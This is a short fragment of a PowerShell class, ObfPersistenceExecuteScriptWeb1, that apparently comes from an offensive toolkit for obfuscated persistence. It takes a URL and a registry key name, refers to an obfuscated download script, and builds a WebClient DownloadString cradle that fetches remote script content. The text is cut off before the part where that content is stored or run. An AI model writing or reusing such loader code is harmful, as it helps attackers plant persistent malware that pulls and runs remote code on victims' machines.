Class ObfPersistenceExecuteScriptWeb1 {

    static Execute ([String]$url, [String]$rKeyName) {
        #Import Obfuscated script
        # ..\..\Download-File-Content\gen-obf\ObfDownloadFileContent1.ps1
        $DoAll = "(New-Object System.Net.WebClient).DownloadString('$url')";
